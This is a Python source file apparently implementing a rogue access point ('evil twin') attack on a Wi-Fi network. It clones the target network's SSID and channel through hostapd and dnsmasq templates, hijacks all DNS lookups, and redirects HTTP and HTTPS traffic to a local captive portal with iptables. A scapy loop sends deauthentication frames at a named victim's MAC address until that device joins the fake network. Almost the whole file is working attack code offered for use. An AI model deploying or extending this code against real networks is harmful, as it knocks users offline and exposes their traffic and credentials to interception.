import subprocess
import time
import shutil
import threading
from http.server import HTTPServer
from CaptivePortal import CaptivePortalHandler
from pathlib import Path
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq


_deauth_stop = threading.Event()

def interface_exists(iface):
    return shutil.which("ip") and subprocess.run(
        ["ip","link","show",iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    ).returncode == 0

# ——— captive portal setup functions ———

def write_configs(ap_iface, ssid, channel, output_dir="."):
    """
    Load your two templates, replace placeholders, and write:
      - hostapd.conf: [INTERFACE NAME], [WiFi NAME], [CHANNEL NAME]
      - dnsmasq.conf: [INTERFACE NAME] + captive-DNS hijack
    """
    BASE_DIR = Path(__file__).parent
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    # 1) hostapd
    hostapd_tmpl = (BASE_DIR / "template_hostapd.conf").read_text()
    hostapd_conf = (
        hostapd_tmpl
          .replace("[INTERFACE NAME]", ap_iface)
          .replace("[WiFi NAME]", ssid)
          .replace("[CHANNEL NAME]", str(channel))
    )
    (out_dir / "hostapd.conf").write_text(hostapd_conf)
    print(f" → hostapd.conf written ({out_dir/'hostapd.conf'})")

    # 2) dnsmasq
    dnsmasq_tmpl = (BASE_DIR / "template_dnsmasq.conf").read_text()
    # replace the interface
    dnsmasq_conf = dnsmasq_tmpl.replace("[INTERFACE NAME]", ap_iface)
    # add DNS-hijack to force all lookups to .1
    dnsmasq_conf += "\n# captive-portal DNS hijack\naddress=/#/192.168.1.1\n"
    (out_dir / "dnsmasq.conf").write_text(dnsmasq_conf)
    print(f" → dnsmasq.conf written ({out_dir/'dnsmasq.conf'})")

def setup_network(ap_iface, uplink_iface="eth0"):

    # flush the interface
    subprocess.run(["ip", "addr", "flush", "dev", ap_iface], check=False)

    # bring up ap_iface as gateway .1/24
    subprocess.run(
        ["ifconfig", ap_iface, "up", "192.168.1.1", "netmask", "255.255.255.0"],
        check=True
    )
    # enable ip_forward (needed for mangle marks)
    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], check=True)

    # optional NAT out if uplink exists
    if interface_exists(uplink_iface):
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", uplink_iface, "-j", "MASQUERADE"],
            check=True
        )
        subprocess.run(
            ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "ACCEPT"],
            check=True
        )
    else:
        print(f"[!] Uplink '{uplink_iface}' not found—skipping NAT")

def install_iptables_captive(ap_iface):
    cmds = [
        # recreate CAPTIVE chain
        # always flush and delete first to avoid errors then recreate
        ["iptables", "-t", "nat", "-F", "CAPTIVE"],
        ["iptables", "-t", "nat", "-X", "CAPTIVE"],
        ["iptables", "-t", "nat", "-N", "CAPTIVE"],
        # skip redirect for marked clients
        ["iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", ap_iface, "-p", "tcp", "--dport", "80",
         "-m", "mark", "--mark", "1", "-j", "RETURN"],
        # redirect everyone else to portal
        ["iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", ap_iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
        # Also redirect HTTPS traffic (will cause cert errors but trigger portal)
        ["iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", ap_iface, "-p", "tcp", "--dport", "443",
         "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
    ]
    for cmd in cmds:
        # never abort on iptables errors
        subprocess.run(cmd, check=False)


def start_captive_http(ap_iface, port=80):
    CaptivePortalHandler.ap_iface = ap_iface
    # Allow socket reuse to avoid "address already in use" errors
    server = HTTPServer(("0.0.0.0", port), CaptivePortalHandler)
    server.allow_reuse_address = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Captive portal HTTP server on port {port}")
    return server

# ——— deauth code unchanged ———

def _deauth_loop(real_bssid, victim_mac, iface):
    pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid)/Dot11Deauth(reason=7)
    while not _deauth_stop.is_set():
        for _ in range(50):
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.1)
        time.sleep(0.5)

def deauth_victim(ap_info, victim_mac, iface):
    real_bssid = ap_info['BSSID']
    print(f"Starting deauth on {victim_mac}…")
    _deauth_stop.clear()
    t = threading.Thread(target=_deauth_loop, args=(real_bssid, victim_mac, iface), daemon=True)
    t.start()

    def assoc_filter(pkt):
        return pkt.haslayer(Dot11AssoReq) and pkt.addr2 == victim_mac

    def assoc_handler(pkt):
        print(f"→ {victim_mac} associated; stopping deauth.")
        _deauth_stop.set()

    sniff(iface=iface, prn=assoc_handler, stop_filter=assoc_filter)
    t.join()
    print(f"Deauth attack ended for {victim_mac}")

# ——— main attack startup ———

def start_attack(ap_iface, ap_info, uplink_iface="eth0", output_dir="."):
    # 1) Generate hostapd.conf & dnsmasq.conf
    write_configs(ap_iface, ap_info['SSID'], ap_info['Channel'], output_dir)

    # 2) Bring up ap_iface with IP before dnsmasq
    setup_network(ap_iface, uplink_iface)

    # 3) Launch hostapd in background (detached)
    print("Launching hostapd…")
    h = subprocess.Popen(
        ["hostapd", f"{output_dir}/hostapd.conf"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print(f"[+] hostapd (pid {h.pid}) started")

    # 4) Wait briefly for the interface to come up
    for i in range(5):
        time.sleep(0.5)
        link = subprocess.run(
            ["ip", "link", "show", ap_iface],
            capture_output=True
        ).stdout.decode()
        if "state UP" in link:
            break
    else:
        print(f"[!] Warning: {ap_iface} never came up")

    # 5) Launch dnsmasq in background (detached)
    print("Launching dnsmasq…")
    d = subprocess.Popen(
        ["dnsmasq", "-C", f"{output_dir}/dnsmasq.conf", "-d"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print(f"[+] dnsmasq (pid {d.pid}) started")

    # 6) Install iptables and start HTTP server
    install_iptables_captive(ap_iface)
    start_captive_http(ap_iface)

    return {"hostapd": h, "dnsmasq": d}